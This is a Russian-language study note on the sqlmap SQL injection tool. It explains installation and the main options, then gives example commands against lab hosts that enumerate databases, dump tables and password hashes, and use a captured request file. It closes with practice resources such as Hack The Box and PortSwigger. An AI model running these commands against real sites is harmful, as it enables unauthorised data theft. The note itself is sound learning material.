[[Введение в SQL]] - Чтобы ознакомиться с языком.

---

# SQLMAP

## Введение

**Sqlmap** — это бесплатный инструмент на **Python**, для автоматизации поиска, эксплуатации и тестирования уязвимостей **SQL**.

[Sqlmap](https://spy-soft.net/sqlmap/) — это, наверное, самый известный сканер для поиска **SQL**-инъекций. Его разработкой занимаются Мирослав Штампар (Хорватия) и Бернардо Дамеле (Италия). Особенность этого сканера в том, что он может не только найти ошибку, но и сразу эксплуатировать ее, причем в полностью автоматическом режиме. Умеет работать с **БД MySQL**, **MS SQL**, **PostgreSQL** и **Oracle**.

**Возможности SQLMap:**

- Автоматическое обнаружение **SQL** инъекций, в том числе слепых инъекций.
- Внедрение в веб-приложение для выполнения произвольных **SQL** запросов и получения несанкционированного доступа к БД.
- Извлечение данных из БД, включая пароли пользователей.
- Возможность работы через прокси и эвазионные техники для обхода **WAF**.
- Поддержка широкого списка **СУБД**, включая **MySQL**, **Oracle**, **PostgreSQL** и др.

Этот инструмент способен обнаружить уязвимости **SQL**-инъекции с использованием различных методов. Если будет обнаружена уязвимость, он способен атаковать сервер для определения имен таблиц, загрузки базы данных и автоматического выполнения SQL-запросов.

Как только он обнаруживает SQL-инъекцию на целевом хосте, вы сможете:

- Провести обширное обнаружение версии базы данных бэкэнда
- Получить имя пользователя и базы данных сессии DBMS
- Перечислить пользователей, хеши паролей, привилегии и базы данных
- Выгрузить всю таблицу/столбцы DBMS или конкретную таблицу/столбцы пользователя
- Выполнить пользовательские SQL-запросы

---

## Установка SQLMap

**SQLMap** по умолчанию установлен в некоторые секьюрити дистрибутивы, такие как [Kali Linux](https://spy-soft.net/kali-linux-live-usb-persistence/) (в полной версии).

Для установки **SQLMap** на **Kali Linux** (легкую версию) или другие дистрибутивы на базе **Debian**, выполните команду:
``` 
sudo apt-get install sqlmap
```
Еще один способ установки — это скачивание из [репозитория проекта на GitHub](https://github.com/sqlmapproject/sqlmap "репозитория проекта на GitHub").

---

## Использование SQLMap на Kali Linux

После установки, откройте справку и изучите **параметры использования**:
```
sqlmap  -h
```
**Параметры справки**:
```
-h, --help — показать основное сообщение справки и завершить выполнение
-hh — показать расширенное сообщение справки и завершить выполнение
--version — показать номер версии программы и завершить выполнение
-v VERBOSE — уровень детализации: 0-6 (по умолчанию 1)
```
>**Цель** — должен быть предоставлен хотя бы один из этих параметров для определения цели(ей):
``` 
-u URL, --url=URL — целевой урл(например, "http://www.site.com/vuln.php?id=1")
-g GOOGLEDORK — обработать результаты Google dork как целевые урлы
```
>**Инъекция** — эти аргументы могут быть использованы для указания, какие параметры тестировать, предоставить пользовательские внедряемые данные и необязательные сценарии модификации:
```
-p TESTPARAMETER — параметр(ы), подлежащий(е) тестированию
--dbms=DBMS — принудительно задать используемую СУБД (базу данных)
```
>**Обнаружение** — эти аргументы могут быть использованы для настройки фазы обнаружения:
```
--level=LEVEL — уровень тестирования (1-5, по умолчанию 1)
--risk=RISK — уровень риска тестирования (1-3, по умолчанию 1)
```
>**Техники** — эти аргументы могут быть использованы для настройки тестирования конкретных техник SQL-инъекций:
```
--technique=TECH.. — используемые техники SQL-инъекций (по умолчанию "BEUSTQ")
```
>**Перечисление** — эти аргументы могут быть использованы для перечисления информации о СУБД, структуре и данных в таблицах:
```
-a, --all — получить все

-b, --banner — получить баннер СУБД
--current-user — получить текущего пользователя СУБД
--current-db — получить текущую базу данных СУБД
--passwords — перечислить хеши паролей пользователей СУБД

--tables — перечислить таблицы базы данных СУБД
--columns — перечислить столбцы таблиц базы данных СУБД
--schema — перечислить схему СУБД

--dump — получить записи таблицы базы данных СУБД
--dump-all — получить все записи таблиц всех баз данных СУБД
-D DB — база данных СУБД для перечисления

-T TBL — таблица(ы) базы данных СУБД для перечисления
-C COL — столбец(ы) таблицы базы данных СУБД для перечисления
```

---

##### **Опции**

- `--data` – указываем параметры для тестирования, передающиеся в **POST**-запросе (например, `data=&quot;txtLoginID=skan&amp;txtPassword=pass&amp;cmdSubmit=Login&quot;`);
- `--crawl` – сканирование сайта с целевого **URL**. С помощью этой опции можно выставить глубину, ниже которой sqlmap не будет сканировать (например, `--crawl=3`);
- `-f --forms` – парсинг и анализ форм на целевом **URL**;
- `-dbs` – ключ для перечисления имеющихся баз данных;
- `--sql-shell` - получить шелл для взаимодействия с базой данных с использованием языка запросов **SQL**.
- `-sql-query STRING` - выполнит указанную нами команду/запрос. Например: `-sql-query "SELECT * FROM products"` 
- `--sqlmap-shell` - интерактивный **shell** самого **sqlmap**. Пример:
	```
	sqlmap -u "http://<IP-адрес>/index.php?username=&password=&" --sqlmap-shell
	
	sqlmap-shell> --dbs
	```
---

##### **Примеры использования**

- `sqlmap --url http://www.hacktory.lab/?id=1` – сканировать параметр id в интерактивном режиме;
- `sqlmap --url http://www.hacktory.lab/?id=1 --batch` – сканировать параметр id автоматически;
- `sqlmap --url http://www.hacktory.lab/?id=1 --dbs` – получить список БД;
- `sqlmap --url http://www.hacktory.lab/?id=1 -D db --tables` – для БД db получить список таблиц;
- `sqlmap --url http://www.hacktory.lab/?id=1 -D db -T table --dump-all` – для БД db и таблицы table получить все данные.

---

##### **Другие примеры**
```
sqlmap --help
sqlmap -u "<url>" --cookie="name=value"
```
Для более детального сканирование можно скопировать нужный пакет с запросом из burpsuite в файл request.txt и далее использовать сканирование:
```
sqlmap -r request.txt --level 5 --risk 3 -p email --batch
```
```
sqlmap -r request.txt --level 5 --risk 3 -p email --batch --dbs --threads 10 --hex 
```
```
sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D <database> --tables --threads 10 --dump-all
```
```
sqlmap -r request.txt --level 5 --risk 3 -p email --batch -D <database> -T <table> -C <column>,<column2> --dump --threads 10
```
где request.txt:
```
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://usage.htb
Connection: close
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6ImVKeENTWE5uTmk0WEtQT0crMXJpM0E9PSIsInZhbHVlIjoiblo4V0tBdGF1REIvOEpadnl3eFRyMWF5Z29LWG1vWGFMaTFBSm1rYnUzMng2MHl4enpWR1paQ2ljaWNZQlZvQ2d4Uy9NbTloVThwSkRQemZwZ2VFNkFBdk15ZkVEOHd0ZzhhTjZtTHhIYSt4aEwrbGRsS0xxSHpGb1I1blZDOGMiLCJtYWMiOiI5NTFmNDBiMzJhZjBkMzhkMjNmNzRkMmUxMTZkYjg5OTBmOWM2MzE3NzIxNzViNjhkMTk3ZWI4ODYxM2FlOGYwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Im9wRVFkK0RRcFk4NlRpTmhUZys5dGc9PSIsInZhbHVlIjoiVUVwYXJtdWg5R3BZSWhEMHhnZDFOVTJZZkVzU3lPY1ViMUxtUWFKZUN5NFpNTHBmSGJRMjV5UDNOYm5IdXhqZGNnRDFicTBhekZYTnJrUXdTNWlWcEh2UVhPTmVlVmYwOXN6WlZzVGFkREZHWWlTOU91a3RNdEFUWGdLMFgwTGMiLCJtYWMiOiJiMzExMGE3ZDliYzczOWYxNzk2NGJiOTliZDQyYzdhZTQzMjBmZjZiZjZhY2QyYWE4YjkyNzg3MThiYTc5MTUzIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1

_token=NX6KOxDfLMuybJ3qXJh69reEQvm2aNkfNxeSui9U&email=qwelab
```

---
# Где новичку практиковаться по SQLi?

Мо­дуль [HTB Academy](https://spy-soft.net/hack-the-box/), пос­вящен­ный SQLi, или [ана­логич­ный модуль](https://tryhackme.com/room/sqlinjectionlm "ана­логич­ный модуль") на пло­щад­ке [TryHackMe](https://spy-soft.net/tryhackme/).

За­тем можете заг­лянуть на сайт PortSwigger и прой­ти «путь» [SQL injection](https://portswigger.net/web-security/learning-paths/sql-injection "SQL injection"). Сра­зу пре­дуп­реждаю, что он слож­ный и даже очень слож­ный для нович­ка, но там вез­де при­веде­ны отве­ты. Луч­ше в них не смот­реть сра­зу, но, если вдруг зас­тря­нете, они выручат.

Еще могу пореко­мен­довать две очень инте­рес­ные лабора­тор­ные работы с пло­щад­ки Hack The Box: PC и Magic или хотя бы те их час­ти, что свя­заны с ата­ками на веб и получе­нием поль­зователь­ско­го фла­га (повыше­ние при­виле­гий в Linux можете пока не тро­гать).

Также отличный ресурс: [SQL injection challenge (hackerdom.ru)](https://sql.training.hackerdom.ru/). ([подсказки](https://forum.antichat.club/threads/423579/page-2))

---